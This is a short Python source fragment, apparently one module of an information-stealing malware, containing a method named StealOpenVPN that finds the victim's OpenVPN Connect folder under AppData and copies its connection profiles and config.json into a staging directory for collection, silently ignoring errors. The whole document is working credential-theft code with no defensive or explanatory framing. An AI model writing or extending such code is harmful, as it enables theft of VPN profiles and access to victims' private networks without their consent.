import os
from pathlib import Path
import shutil


async def StealOpenVPN(self, directory_path: str) -> None:
    try:
        openvpn_folder = os.path.join(self.appdata, 'OpenVPN Connect')
        if not os.path.isdir(openvpn_folder):
            return
        
        openvpn_accounts = os.path.join(directory_path, "VPN", 'OpenVPN')
        os.makedirs(openvpn_accounts, exist_ok=True)
        profiles_src = os.path.join(openvpn_folder, 'profiles')
        config_src = os.path.join(openvpn_folder, 'config.json')

        if Path(profiles_src).is_dir():
            shutil.copytree(Path(profiles_src), openvpn_accounts, dirs_exist_ok=True)
        else:
            shutil.copy2(Path(profiles_src), openvpn_accounts)

        if Path(config_src).is_dir():
            shutil.copytree(Path(config_src), openvpn_accounts, dirs_exist_ok=True)
        else:
            shutil.copy2(Path(config_src), openvpn_accounts)
    except Exception as e:
        print(f"openvpn error - {str(e)}")
        pass
